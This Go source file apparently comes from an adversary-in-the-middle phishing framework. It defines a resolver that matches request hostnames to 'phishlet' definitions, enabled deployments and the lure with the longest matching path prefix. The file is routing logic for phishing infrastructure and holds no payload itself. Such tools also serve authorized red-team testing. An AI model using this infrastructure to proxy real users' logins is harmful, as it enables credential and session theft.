package aitm

import (
	"fmt"
	"strings"
	"sync"
)

// PhishletResolver maps request hostnames to their phishlet definition,
// deployment, and lure. Definitions are registered via RegisterDef when the
// phishlet watcher loads or reloads a YAML file. Deployments and lures are
// queried from the store.
type PhishletResolver struct {
	mu        sync.RWMutex
	defs      map[string]*PhishletDef // phishlet name → compiled def
	cfgStore  PhishletStore
	lureStore LureStore
}

func NewPhishletResolver(cfgStore PhishletStore, lureStore LureStore) *PhishletResolver {
	return &PhishletResolver{
		defs:      make(map[string]*PhishletDef),
		cfgStore:  cfgStore,
		lureStore: lureStore,
	}
}

// RegisterDef is called by the phishlet watcher when a YAML file is loaded or reloaded.
func (r *PhishletResolver) RegisterDef(def *PhishletDef) {
	r.mu.Lock()
	r.defs[def.Name] = def
	r.mu.Unlock()
}

// ResolveHostname returns the phishlet definition, deployment, and
// best-matching lure for a request. When multiple lures share a phishlet,
// the longest path prefix wins.
func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*PhishletDef, *PhishletDeployment, *Lure, error) {
	deployments, err := r.cfgStore.ListPhishletDeployments()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("listing phishlet deployments: %w", err)
	}

	r.mu.RLock()
	defer r.mu.RUnlock()

	for _, deployment := range deployments {
		if !deployment.Enabled {
			continue
		}
		def, ok := r.defs[deployment.Name]
		if !ok {
			continue
		}
		if !def.MatchesHost(hostname, deployment.BaseDomain) {
			continue
		}
		lures, err := r.lureStore.ListLures()
		if err != nil {
			return nil, nil, nil, fmt.Errorf("listing lures: %w", err)
		}
		var matched *Lure
		matchLen := -1
		for _, lure := range lures {
			if lure.Phishlet != deployment.Name {
				continue
			}
			if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
				if len(lure.Path) > matchLen {
					matched = lure
					matchLen = len(lure.Path)
				}
			}
		}
		return def, deployment, matched, nil
	}
	return nil, nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
}
